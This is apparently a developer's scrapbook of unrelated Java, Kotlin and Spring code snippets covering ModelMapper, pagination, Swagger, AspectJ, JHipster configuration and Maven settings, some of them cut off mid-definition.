Field field = ReflectionUtils.findField(MyEntity.class, "createDate");

3. Using reflection, set the field’s accessible flag to true so we can then set the field’s value. The accessible flag toggles reflection access to Java internals, such as fields. This step uses the Spring ReflectionUtils.makeAccessible method. This method takes one argument, the Field reference.
ReflectionUtils.makeAccessible(field);
1
	
ReflectionUtils.makeAccessible(field);

4. Using reflection, set the value on the object. This step uses the Spring ReflectionUtils.setField method to set the value on the object. This method takes three arguments, the Field reference, the object to set the value on, and the value to set.
ReflectionUtils.setField(field, object, value);
1
	
ReflectionUtils.setField(field, object, value);-
--------------------------------------------------------------------------------------------------------
List<String> resultList = Splitter.on(' ')
    .trimResults()
    .omitEmptyStrings()
    .splitToList("lorem ipsum dolor sit amet");   
String[] strArray = resultList.toArray(new String[0]);
--------------------------------------------------------------------------------------------------------
@SpringBootApplication(exclude = {        
    ElasticSearchRestHealthIndicatorAutoConfiguration.class
})
public class YourApplication

management.health.elasticsearch.enabled: false
--------------------------------------------------------------------------------------------------------
spring.elasticsearch.jest.uris=http://search.example.com:9200
spring.elasticsearch.jest.read-timeout=10000
spring.elasticsearch.jest.username=user
spring.elasticsearch.jest.password=secret
--------------------------------------------------------------------------------------------------------
import io.github.jhipster.config.JHipsterConstants;
import io.github.jhipster.config.liquibase.AsyncSpringLiquibase;

import com.fasterxml.jackson.datatype.hibernate5.Hibernate5Module;
import liquibase.integration.spring.SpringLiquibase;
import org.h2.tools.Server;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.boot.autoconfigure.liquibase.LiquibaseProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;
import org.springframework.core.env.Environment;
import org.springframework.data.elasticsearch.repository.config.EnableElasticsearchRepositories;
import org.springframework.core.task.TaskExecutor;
import org.springframework.data.jpa.repository.config.EnableJpaAuditing;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.transaction.annotation.EnableTransactionManagement;

import javax.sql.DataSource;
import java.sql.SQLException;

@Configuration
@EnableJpaRepositories("com.springio.store.repository")
@EnableJpaAuditing(auditorAwareRef = "springSecurityAuditorAware")
@EnableTransactionManagement
@EnableElasticsearchRepositories("com.springio.store.repository.search")
public class DatabaseConfiguration {

    private final Logger log = LoggerFactory.getLogger(DatabaseConfiguration.class);

    private final Environment env;

    public DatabaseConfiguration(Environment env) {
        this.env = env;
    }

    /**
     * Open the TCP port for the H2 database, so it is available remotely.
     *
     * @return the H2 database TCP server
     * @throws SQLException if the server failed to start
     */
    @Bean(initMethod = "start", destroyMethod = "stop")
    @Profile(JHipsterConstants.SPRING_PROFILE_DEVELOPMENT)
    public Server h2TCPServer() throws SQLException {
        return Server.createTcpServer("-tcp","-tcpAllowOthers");
    }

    @Bean
    public SpringLiquibase liquibase(@Qualifier("taskExecutor") TaskExecutor taskExecutor,
            DataSource dataSource, LiquibaseProperties liquibaseProperties) {

        // Use liquibase.integration.spring.SpringLiquibase if you don't want Liquibase to start asynchronously
        SpringLiquibase liquibase = new AsyncSpringLiquibase(taskExecutor, env);
        liquibase.setDataSource(dataSource);
        liquibase.setChangeLog("classpath:config/liquibase/master.xml");
        liquibase.setContexts(liquibaseProperties.getContexts());
        liquibase.setDefaultSchema(liquibaseProperties.getDefaultSchema());
        liquibase.setDropFirst(liquibaseProperties.isDropFirst());
        if (env.acceptsProfiles(JHipsterConstants.SPRING_PROFILE_NO_LIQUIBASE)) {
            liquibase.setShouldRun(false);
        } else {
            liquibase.setShouldRun(liquibaseProperties.isEnabled());
            log.debug("Configuring Liquibase");
        }
        return liquibase;
    }

    @Bean
    public Hibernate5Module hibernate5Module() {
        return new Hibernate5Module();
    }
}
--------------------------------------------------------------------------------------------------------
@ConfigurationProperties(prefix = "jhipster", ignoreUnknownFields = false)
@PropertySources({
    @PropertySource(value = "classpath:git.properties", ignoreResourceNotFound = true),
    @PropertySource(value = "classpath:META-INF/build-info.properties", ignoreResourceNotFound = true)
})
--------------------------------------------------------------------------------------------------------
    /**
     * POST  /products : Create a new product.
     *
     * @param product the product to create
     * @return the ResponseEntity with status 201 (Created) and with body the new product, or with status 400 (Bad Request) if the product has already an ID
     * @throws URISyntaxException if the Location URI syntax is incorrect
     */
    @PostMapping("/products")
    @Timed
    public ResponseEntity<Product> createProduct(@RequestBody Product product) throws URISyntaxException {
        log.debug("REST request to save Product : {}", product);
        if (product.getId() != null) {
            return ResponseEntity.badRequest().headers(HeaderUtil.createFailureAlert(ENTITY_NAME, "idexists", "A new product cannot already have an ID")).body(null);
        }
        Product result = productService.save(product);
        return ResponseEntity.created(new URI("/api/products/" + result.getId()))
            .headers(HeaderUtil.createEntityCreationAlert(ENTITY_NAME, result.getId().toString()))
            .body(result);
    }
--------------------------------------------------------------------------------------------------------
import com.springio.store.service.SocialService;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import org.springframework.social.connect.Connection;
import org.springframework.social.connect.web.ProviderSignInUtils;
import org.springframework.social.support.URIBuilder;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.context.request.WebRequest;
import org.springframework.web.servlet.view.RedirectView;

@RestController
@RequestMapping("/social")
public class SocialController {

    private final Logger log = LoggerFactory.getLogger(SocialController.class);

    private final SocialService socialService;

    private final ProviderSignInUtils providerSignInUtils;

    public SocialController(SocialService socialService, ProviderSignInUtils providerSignInUtils) {
        this.socialService = socialService;
        this.providerSignInUtils = providerSignInUtils;
    }

    @GetMapping("/signup")
    public RedirectView signUp(WebRequest webRequest, @CookieValue(name = "NG_TRANSLATE_LANG_KEY", required = false, defaultValue = "\"en\"") String langKey) {
        try {
            Connection<?> connection = providerSignInUtils.getConnectionFromSession(webRequest);
            socialService.createSocialUser(connection, langKey.replace("\"", ""));
            return new RedirectView(URIBuilder.fromUri("/#/social-register/" + connection.getKey().getProviderId())
                .queryParam("success", "true")
                .build().toString(), true);
        } catch (Exception e) {
            log.error("Exception creating social user: ", e);
            return new RedirectView(URIBuilder.fromUri("/#/social-register/no-provider")
                .queryParam("success", "false")
                .build().toString(), true);
        }
    }
}
--------------------------------------------------------------------------------------------------------
@GET
@Consumes({ "application/json" })
@Produces({ "application/json" })
@ApiOperation(value = "", notes = "Retrieves Multi-Target Application operations ", response = Operation.class, responseContainer = "List", authorizations = {
    @Authorization(value = "oauth2", scopes = {
        
    })
}, tags={  })
@ApiResponses(value = { 
    @ApiResponse(code = 200, message = "OK", response = Operation.class, responseContainer = "List") })
public Response getMtaOperations( @ApiParam(value = "")  @QueryParam("last") Integer last,  @ApiParam(value = "")  @QueryParam("state") List<String> state) {
    return delegate.getMtaOperations(last, state, securityContext, spaceGuid);
}
--------------------------------------------------------------------------------------------------------
     public Converter<UnicornDto, Unicorn> toEntityConverter() {
        return context -> {
            UnicornDto source = context.getSource();
            Unicorn destination = context.getDestination();
            mapSpecificFields(source, destination);
            return context.getDestination();
        };
    }
	
	public Converter<Unicorn, UnicornDto> toDtoConverter() {
        return context -> {
            Unicorn source = context.getSource();
            UnicornDto destination = context.getDestination();
            mapSpecificFields(source, destination);
            return context.getDestination();
        };
    }
--------------------------------------------------------------------------------------------------------
public abstract class AbstractMapper<E extends AbstractEntity, D extends AbstractDto> implements Mapper<E, D> {

    @Autowired
    ModelMapper mapper;

    private Class<E> entityClass;
    private Class<D> dtoClass;

    AbstractMapper(Class<E> entityClass, Class<D> dtoClass) {
        this.entityClass = entityClass;
        this.dtoClass = dtoClass;
    }

    @Override
    public E toEntity(D dto) {
        return Objects.isNull(dto)
                ? null
                : mapper.map(dto, entityClass);
    }

    @Override
    public D toDto(E entity) {
        return Objects.isNull(entity)
                ? null
                : mapper.map(entity, dtoClass);
    }

    Converter<E, D> toDtoConverter() {
        return context -> {
            E source = context.getSource();
            D destination = context.getDestination();
            mapSpecificFields(source, destination);
            return context.getDestination();
        };
    }

    Converter<D, E> toEntityConverter() {
        return context -> {
            D source = context.getSource();
            E destination = context.getDestination();
            mapSpecificFields(source, destination);
            return context.getDestination();
        };
    }

    void mapSpecificFields(E source, D destination) {
    }

    void mapSpecificFields(D source, E destination) {
    }
}

@Component
public class DroidMapper extends AbstractMapper<Droid, DroidDto> {

    private final ModelMapper mapper;
    private final UnicornRepository unicornRepository;

    @Autowired
    public DroidMapper(ModelMapper mapper, UnicornRepository unicornRepository) {
        super(Droid.class, DroidDto.class);
        this.mapper = mapper;
        this.unicornRepository = unicornRepository;
    }

    @PostConstruct
    public void setupMapper() {
        mapper.createTypeMap(Droid.class, DroidDto.class)
                .addMappings(m -> m.skip(DroidDto::setUnicornId)).setPostConverter(toDtoConverter());
        mapper.createTypeMap(DroidDto.class, Droid.class)
                .addMappings(m -> m.skip(Droid::setUnicorn)).setPostConverter(toEntityConverter());
    }

    @Override
    public void mapSpecificFields(Droid source, DroidDto destination) {
        destination.setUnicornId(getId(source));
    }

    private Long getId(Droid source) {
        return Objects.isNull(source) || Objects.isNull(source.getId()) ? null : source.getUnicorn().getId();
    }

    @Override
    void mapSpecificFields(DroidDto source, Droid destination) {
        destination.setUnicorn(unicornRepository.findById(source.getUnicornId()).orElse(null));
    }
}

@Component
public class UnicornMapper extends AbstractMapper<Unicorn, UnicornDto> {

    @Autowired
    public UnicornMapper() {
        super(Unicorn.class, UnicornDto.class);
    }
}

    @PostConstruct
    public void setupMapper() {
        mapper.createTypeMap(Droid.class, DroidDto.class)
                .addMappings(m -> m.skip(DroidDto::setUnicornId)).setPostConverter(toDtoConverter());
        mapper.createTypeMap(DroidDto.class, Droid.class)
                .addMappings(m -> m.skip(Droid::setUnicorn)).setPostConverter(toEntityConverter());
    }
--------------------------------------------------------------------------------------------------------
"findByNameContaining" : {
  "href" : "http://localhost:8080/subjects/search/nameContains{?name,page,size,sort}",
  "templated" : true
}

@GetMapping(params = { "page", "size" })

@GetMapping(params = { "page", "size" })
public List<Foo> findPaginated(@RequestParam("page") int page, 
  @RequestParam("size") int size, UriComponentsBuilder uriBuilder,
  HttpServletResponse response) {
    Page<Foo> resultPage = service.findPaginated(page, size);
    if (page > resultPage.getTotalPages()) {
        throw new MyResourceNotFoundException();
    }
    eventPublisher.publishEvent(new PaginatedResultsRetrievedEvent<Foo>(
      Foo.class, uriBuilder, response, page, resultPage.getTotalPages(), size));
 
    return resultPage.getContent();
}


    @GetMapping("/test")
    public ResponseEntity<Iterable<FileResponse>> get() {
        final DateTimePeriod dataTimePeriod = new DateTimePeriod(
                DateUtils.asDate(LocalDateTime.now().minus(50, ChronoUnit.DAYS)),
                DateUtils.asDate(LocalDateTime.now().plus(50, ChronoUnit.DAYS)));
        return ResponseEntity.ok()
                .contentType(MediaType.APPLICATION_JSON)
                .body(this.getModelMapper().mapAll(this.getFileService().findRecordsCreatedByPeriod(dataTimePeriod), FileResponse.class));
    }

    @GetMapping("/test1")
    public ResponseEntity<Iterable<FileResponse>> get1() {
        final DateTimePeriod dataTimePeriod = new DateTimePeriod(
                DateUtils.asDate(LocalDateTime.now().minus(50, ChronoUnit.DAYS)),
                DateUtils.asDate(LocalDateTime.now().plus(50, ChronoUnit.DAYS)));
        return ResponseEntity.ok()
                .contentType(MediaType.APPLICATION_JSON)
                .body(this.getModelMapper().mapAll(this.getFileService().findRecordsModifiedByPeriod(dataTimePeriod), FileResponse.class));
    }

    @GetMapping("/test2")
    public ResponseEntity<Iterable<FileResponse>> get2() {
        final AuthenticatedUser user = AuthenticatedUser.builder().userId("ee9cb324-1781-4bb6-6131-08d727c2cbb2").ownerId("b3a341c7-43d0-41b9-af35-cb4cf3b13476").build();
        return ResponseEntity.ok()
                .contentType(MediaType.APPLICATION_JSON)
                .body(this.getModelMapper().mapAll(this.getFileService().findRecordsCreatedByUser(user), FileResponse.class));
    }

    @GetMapping("/test3")
    public Iterable<FileEntity> get3() {
        final AuthenticatedUser user = AuthenticatedUser.builder().userId("ee9cb324-1781-4bb6-6131-08d727c2cbb2").ownerId("b3a341c7-43d0-41b9-af35-cb4cf3b13476").build();
        return this.getFileService().findRecordsModifiedByUser(user);
    }

    @Autowired
    private FileRepository fileRepository;

    @GetMapping("/test4")
    public ResponseEntity<Stream<FileEntity>> get4() {
        return ResponseEntity.ok()
                .contentType(MediaType.APPLICATION_JSON)
                .body(this.fileRepository.streamAll());
    }
	
https://www.baeldung.com/rest-api-pagination-in-spring
https://www.baeldung.com/spring-data-jpa-pagination-sorting
--------------------------------------------------------------------------------------------------------
@WebMvcTest(controllers = PagedController.class)
class PagedControllerTest {

  @MockBean
  private MovieCharacterRepository characterRepository;

  @Autowired
  private MockMvc mockMvc;

  @Test
  void evaluatesSortParameter() throws Exception {

    mockMvc.perform(get("/characters/sorted")
        .param("sort", "id,desc")   // <-- no space after comma!!!
        .param("sort", "name,asc")) // <-- no space after comma!!!
        .andExpect(status().isOk());

    ArgumentCaptor<Sort> sortCaptor = ArgumentCaptor.forClass(Sort.class);
    verify(characterRepository).findAllSorted(sortCaptor.capture());
    Sort sort = sortCaptor.getValue();

    assertThat(sort).hasSort("name", Sort.Direction.ASC);
    assertThat(sort).hasSort("id", Sort.Direction.DESC);
  }
}
--------------------------------------------------------------------------------------------------------
spring.data.web.pageable.size-parameter=size
spring.data.web.pageable.page-parameter=page
spring.data.web.pageable.default-page-size=20
spring.data.web.pageable.one-indexed-parameters=false
spring.data.web.pageable.max-page-size=2000
spring.data.web.pageable.prefix=
spring.data.web.pageable.qualifier-delimiter=_

@RestController
class PagedController {

  @GetMapping(path = "/characters/qualifier")
  Page<MovieCharacter> loadCharactersPageWithQualifier(
      @Qualifier("my") Pageable pageable) {
    ...
  }

}

@RestController
class PagedController {

  @GetMapping(path = "/characters/page")
  Page<MovieCharacter> loadCharactersPage(
      @PageableDefault(page = 0, size = 20)
      @SortDefault.SortDefaults({
          @SortDefault(sort = "name", direction = Sort.Direction.DESC),
          @SortDefault(sort = "id", direction = Sort.Direction.ASC)
      }) Pageable pageable) {
    ...
  }
  
}
--------------------------------------------------------------------------------------------------------
{"userId":"ee9cb324-1781-4bb6-6131-08d727c2cbb2","ownerId":"b3a341c7-43d0-41b9-af35-cb4cf3b13476"}
{"userId": "ee9cb324-1781-4bb6-6131-08d727c2cbb2","ownerId": "b3a341c7-43d0-41b9-af35-cb4cf3b13476"}
{"userId":"ee9cb324-1781-4bb6-6131-08d727c2cbb2","ownerId":"b3a341c7-43d0-41b9-af35-cb4cf3b13476"}

https://habr.com/ru/post/438808/
https://github.com/promoscow/modelmapper-demo
{"userId": "ee9cb324-1781-4bb6-6131-08d727c2cbb2","ownerId": "b3a341c7-43d0-41b9-af35-cb4cf3b13476"}
@PostConstruct
public void setupMapper() {
    mapper.createTypeMap(Droid.class, DroidDto.class)
            .addMappings(m -> m.skip(DroidDto::setUnicornId)).setPostConverter(toDtoConverter());
    mapper.createTypeMap(DroidDto.class, Droid.class)
            .addMappings(m -> m.skip(Droid::setUnicorn)).setPostConverter(toEntityConverter());
}

{
	"name": "name-test",
	"sku": "sku-test"
}
--------------------------------------------------------------------------------------------------------
String json = "{ \"color\" : \"Black\", \"type\" : \"BMW\" }";
Map<String, Object> map 
  = objectMapper.readValue(json, new TypeReference<Map<String,Object>>(){});
  
https://javainterviewpoint.com/jackson-json-example-objectmapper/
--------------------------------------------------------------------------------------------------------
    Converter<DogData, DogInfo> myConverter = new Converter<DogData, DogInfo>()
    {
        public DogInfo convert(MappingContext<DogData, DogInfo> context)
        {
            DogData s = context.getSource();
            DogInfo d = context.getDestination();
            d.setName(s.getName());
            d.setLarge(s.getMass() > 25);
            return d;
        }
    };

    mm.addConverter(myConverter);
	
	   Converter<Integer, Boolean> convertMassToLarge = new Converter<Integer, Boolean>()
    {
        public Boolean convert(MappingContext<Integer, Boolean> context)
        {
            // If the dog weighs more than 25, then it must be large
            return context.getSource() > 25;
        }
    };

    PropertyMap<DogData, DogInfo> mymap = new PropertyMap<DogData, DogInfo>()
    {
        protected void configure()
        {
            // Note: this is not normal code. It is "EDSL" so don't get confused
            map(source.getName()).setName(null);
            using(convertMassToLarge).map(source.getMass()).setLarge(false);
        }
    };

    mm.addMappings(mymap);
--------------------------------------------------------------------------------------------------------
@ApiImplicitParams({
    @ApiImplicitParam(
        name = "kambiTransaction",
        value = "A JSON value representing a transaction. An example of the expected schema can be found down here. The fields marked with * means that they are required. See the schema of KambiTransaction for more information.",
        required = true,
        dataType = "String",
        paramType = "body",
        examples = @Example(value = {@ExampleProperty(mediaType = "application/json", value = "{foo: whatever, bar: whatever2}")}))})
--------------------------------------------------------------------------------------------------------
  /**
   * This example demonstrates how ModelMapper automatically maps properties from Order to OrderDTO.
   */
  static void mapAutomatically() {
    Order order = createOrder();
    ModelMapper modelMapper = new ModelMapper();
    OrderDTO orderDTO = modelMapper.map(order, OrderDTO.class);
    assertOrdersEqual(order, orderDTO);
  }

  /**
   * This example demonstrates how ModelMapper can be used to explicitly map properties from an
   * Order to OrderDTO.
   */
  static void mapExplicitly() {
    Order order = createOrder();
    ModelMapper modelMapper = new ModelMapper();
    modelMapper.addMappings(new PropertyMap<Order, OrderDTO>() {
      @Override
      protected void configure() {
        map().setBillingStreet(source.getBillingAddress().getStreet());
        map(source.billingAddress.getCity(), destination.billingCity);
      }
    });

    OrderDTO orderDTO = modelMapper.map(order, OrderDTO.class);
    assertOrdersEqual(order, orderDTO);
  }
--------------------------------------------------------------------------------------------------------
@ApiModel(subTypes = {BalanceUpdate.class, UserMessage.class})
class PushRequest {
    @ApiModelProperty(value = "status", example = "push")
    private final String status;;
}
@ApiParam(
  value = "A JSON value representing a transaction. An example of the expected schema can be found down here. The fields marked with an * means that they are required.",
  examples = @Example(value = 
    @ExampleProperty(
      mediaType = MediaType.APPLICATION_JSON,
      value = "{foo: whatever, bar: whatever2}"
    )
  )
)

<dependency>
            <groupId>io.springfox</groupId>
            <artifactId>springfox-swagger2</artifactId>
            <version>3.0.0-SNAPSHOT</version>
        </dependency>
        <dependency>
            <groupId>io.springfox</groupId>
            <artifactId>springfox-swagger-ui</artifactId>
            <version>3.0.0-SNAPSHOT</version>
        </dependency>
        <dependency>
            <groupId>io.springfox</groupId>
            <artifactId>springfox-spring-webmvc</artifactId>
            <version>3.0.0-SNAPSHOT</version>
        </dependency>
--------------------------------------------------------------------------------------------------------
server:
  port: 5555
  servlet:
      context-path: /xxxx
  tomcat:
      remote-ip-header: x-forward-for
      uri-encoding: UTF-8
      max-threads: 1000
      max-http-header-size: 8096
 ———————————————— 
版权声明：本文为CSDN博主「Moshow郑锴」的原创文章，遵循CC 4.0 by-sa版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/moshowgame/article/details/82597326
--------------------------------------------------------------------------------------------------------
PRAGMA foreign_keys = "1";
SELECT type,name,sql,tbl_name,'0' AS temp FROM sqlite_master UNION SELECT type,name,sql,tbl_name,'1' AS temp FROM sqlite_temp_master;
PRAGMA encoding
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `elements` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `elements` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `elements` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `elements` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `sqlite_sequence` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `sqlite_sequence` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `sqlite_sequence` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `sqlite_sequence` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;
SELECT COUNT(*) FROM (SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC);
SELECT `_rowid_`,* FROM `android_metadata` ORDER BY `_rowid_` ASC LIMIT 0, 50000;

--------------------------------------------------------------------------------------------------------
import java.io.File;

public class JarDetails {
    private final Class<?> clazz;

    public JarDetails(final Class clazz) {
        this.clazz = clazz;
    }

    public String getJarVersion() {
        return String.valueOf(clazz.getPackage().getImplementationVersion());
    }

    public String getJarName() {
        final File
                f =
                new File(clazz.getProtectionDomain().getCodeSource().getLocation().toString());
        return f.getName();
    }
}
--------------------------------------------------------------------------------------------------------
import com.google.gson.annotations.SerializedName;

import java.util.List;

public class Settings {

    @SerializedName("globalSettings")
    private GlobalSettings globalSettings;
    @SerializedName("commands")
    private List<Command> commands;

    public GlobalSettings getGlobalSettings() {
        return globalSettings;
    }

    public List<Command> getCommands() {
        return commands;
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.actuate.health.Health;
import org.springframework.boot.actuate.health.HealthIndicator;
import org.springframework.stereotype.Component;

import java.util.Random;

@Component
public class CustomHealth implements HealthIndicator {

    @Override
    public Health health() {

        int systemStatusCode = generateSystemStatusCode();

        if (systemStatusCode == 1) {
            return Health.up().build();
        }

        if (systemStatusCode == 2) {
            return Health.outOfService().build();
        }

        return Health.down().withDetail("Error : ", systemStatusCode).build();
    }

    /**
     * Implement logic to checking your system health
     * @return int
     */
    private int generateSystemStatusCode() {
        Random rand = new Random();
        return rand.nextInt(3) + 1;
    }

}
--------------------------------------------------------------------------------------------------------
    @AfterReturning(pointcut = "execution(public String ru.sysout.aspectsdemo.service.FullNameComposer.*(..))", returning = "result")
    public void logAfterReturning(JoinPoint joinPoint, Object result) {
        logger.log(Level.INFO, "возвращенное значение: " + result.toString());
    }
--------------------------------------------------------------------------------------------------------
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.annotation.After;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;
import org.springframework.stereotype.Component;

@Aspect
@Component
public class EmployeeServiceAspect {

	@Before(value = "execution(* com.javainuse.service.EmployeeService.*(..)) and args(name,empId)")
	public void beforeAdvice(JoinPoint joinPoint, String name, String empId) {
		System.out.println("Before method:" + joinPoint.getSignature());

		System.out.println("Creating Employee with name - " + name + " and id - " + empId);
	}

	@After(value = "execution(* com.javainuse.service.EmployeeService.*(..)) and args(name,empId)")
	public void afterAdvice(JoinPoint joinPoint, String name, String empId) {
		System.out.println("After method:" + joinPoint.getSignature());

		System.out.println("Successfully created Employee with name - " + name + " and id - " + empId);
	}
}
--------------------------------------------------------------------------------------------------------
import java.math.BigDecimal

class SalaryCalculator(baseSalary: BigDecimal, bonuses: BigDecimal, overtime: BigDecimal) {

    private val salaryData: SalaryData

    val income: BigDecimal
        get() = salaryData.basePay.add(salaryData.bonuses.add(salaryData.overtime))

    init {
        this.salaryData = SalaryData(baseSalary, bonuses, overtime)
    }

    internal inner class SalaryData(val basePay: BigDecimal, val bonuses: BigDecimal, val overtime: BigDecimal)
}

fun main(args: Array<String>) {
    val salaryCalculator = SalaryCalculator(BigDecimal(1000), BigDecimal(100), BigDecimal(40))
    println(salaryCalculator.income)
}
--------------------------------------------------------------------------------------------------------

import java.util.List;

import com.predic8.membrane.core.Router;
import com.predic8.membrane.core.rules.Rule;

public class RuleUtil {
	public static String getRuleIdentifier(Rule rule) {
		return rule.toString() + (rule.getKey().getPort() == -1 ? "" : ":" + rule.getKey().getPort());
	}

	public static Rule findRuleByIdentifier(Router router, String name) throws Exception {
		List<Rule> rules = router.getRuleManager().getRules();
		for (Rule rule : rules) {
			if ( name.equals(getRuleIdentifier(rule))) return rule;
		}
		return null;
	}

}
--------------------------------------------------------------------------------------------------------
interface OnFinishListener {
  fun onFinish()
}

fun runALongOperation(listener: OnFinishListener? = null) {
  for (i in 1 until 100000000) {
		
	}
    
  listener?.onFinish()
}

fun main(args: Array<String>) {
	runALongOperation(object: OnFinishListener{
      override fun onFinish() {
        println("Finish")   
      }
	})
}
--------------------------------------------------------------------------------------------------------
static {
		String version = "4"; // fallback
		try {
			Properties p = new Properties(); // Production
			p.load(Constants.class.getResourceAsStream("/META-INF/maven/org.membrane-soa/service-proxy-core/pom.properties"));
			version = p.getProperty("version");
		} catch (Exception e) {
			try {
				Properties p = new Properties(); // Development
				p.load(new FileInputStream("target/maven-archiver/pom.properties"));
				version = p.getProperty("version") + " - DEVELOPMENT";
			} catch (Exception e2) {
			}
		}
		VERSION = version;
	}
--------------------------------------------------------------------------------------------------------
abstract class ParentBase implements Parent
{
  @Override
  public final Long getParentProperty()
  {
      return parentProperty_;
  }


  protected void setParentProperty(Long value)
  {
      parentProperty_ = value;
  }


  private Long parentProperty_;
}


abstract class ParentBuilder<T extends ParentBuilder<T>>
{
  T withParentProperty(Long value)
  {
      getParent().setParentProperty(value);
      return getThis();
  }


  protected abstract ParentBase getParent();


  protected abstract T getThis();
}


final class ConcreteChild1 extends ParentBase implements Child1
{
--------------------------------------------------------------------------------------------------------
<?xml version="1.0"?>
<config>
    <className>SubMealBuilderB</className>
</config>

import javax.xml.parsers.*;
import org.w3c.dom.*;
import org.xml.sax.SAXException;
import java.io.*;
public class XMLUtil
{
//该方法用于从XML配置文件中提取具体类类名，并返回一个实例对象
	public static Object getBean()
	{
		try
		{
			//创建文档对象
			DocumentBuilderFactory dFactory = DocumentBuilderFactory.newInstance();
			DocumentBuilder builder = dFactory.newDocumentBuilder();
			Document doc;							
			doc = builder.parse(new File("config.xml")); 
		
			//获取包含类名的文本节点
			NodeList nl = doc.getElementsByTagName("className");
            Node classNode=nl.item(0).getFirstChild();
            String cName=classNode.getNodeValue();
            
            //通过类名生成实例对象并将其返回
            Class c=Class.forName(cName);
	  	    Object obj=c.newInstance();
            return obj;
           }   
           	catch(Exception e)
           	{
           		e.printStackTrace();
           		return null;
           	}
		}
}
--------------------------------------------------------------------------------------------------------

import static org.hamcrest.CoreMatchers.is;
import static org.junit.Assert.assertThat;

import cucumber.api.java.en.Given;
import cucumber.api.java.en.When;
import domainapp.dom.modules.simple.SimpleObject;
import domainapp.dom.modules.simple.SimpleObjects;
import java.util.List;
import java.util.UUID;
import org.apache.isis.core.specsupport.specs.CukeGlueAbstract;

/**
 * Test Simple Object Operations
 */
public class SimpleObjectGlue extends CukeGlueAbstract {

  @Given("^there are.* (\\d+) simple objects$")
  public void thereAreNumSimpleObjects(int n) throws Throwable {
    try {
      final List<SimpleObject> findAll = service(SimpleObjects.class).listAll();
      assertThat(findAll.size(), is(n));
      putVar("list", "all", findAll);

    } finally {
      assertMocksSatisfied();
    }
  }

  @When("^I create a new simple object$")
  public void createNewSimpleObject() throws Throwable {
    service(SimpleObjects.class).create(UUID.randomUUID().toString());
  }

}
--------------------------------------------------------------------------------------------------------
import org.junit.runner.RunWith;

import cucumber.api.CucumberOptions;
import cucumber.api.junit.Cucumber;


/**
 * Runs scenarios in all <tt>.feature</tt> files (this package and any subpackages).
 */
@RunWith(Cucumber.class)
@CucumberOptions(format = {"html:target/cucumber-html-report", "json:target/cucumber.json"},
    glue = {"classpath:domainapp.integtests.specglue"}, strict = true, tags = {"~@backlog",
        "~@ignore"})
public class RunSpecs {
  // intentionally empty
}
--------------------------------------------------------------------------------------------------------
				<plugin>
					<groupId>org.apache.rat</groupId>
					<artifactId>apache-rat-plugin</artifactId>
					<version>0.10</version>
					<configuration>
						<addDefaultLicenseMatchers>true</addDefaultLicenseMatchers>
						<excludeSubProjects>true</excludeSubProjects>
						<excludes>
							<exclude>**/target/**</exclude>
							<exclude>**/target-ide/**</exclude>

							<exclude>**/*.project</exclude>
							<exclude>**/.classpath</exclude>
							<exclude>**/.settings/**</exclude>
							<exclude>**/*.launch</exclude>
							<exclude>**/ide/eclipse/launch/**</exclude>
							<exclude>**/ide/intellij/launch/**</exclude>
							<exclude>src/site/resources/ide/eclipse/**</exclude>

							<exclude>**/rebel.xml</exclude>
							<exclude>**/*.gitignore</exclude>
							<exclude>**/*.log</exclude>
							<exclude>**/*.pdn</exclude>
							<exclude>**/*.svg</exclude>
							<exclude>**/*.json</exclude>
							<exclude>**/*.min.js</exclude>
							<exclude>**/*.js</exclude>

							<exclude>**/translations.pot</exclude>
							<exclude>**/translations*.po</exclude>
						</excludes>
						<licenses>
                            <license implementation="org.apache.rat.analysis.license.SimplePatternBasedLicense">
                                <licenseFamilyCategory>AL2</licenseFamilyCategory>
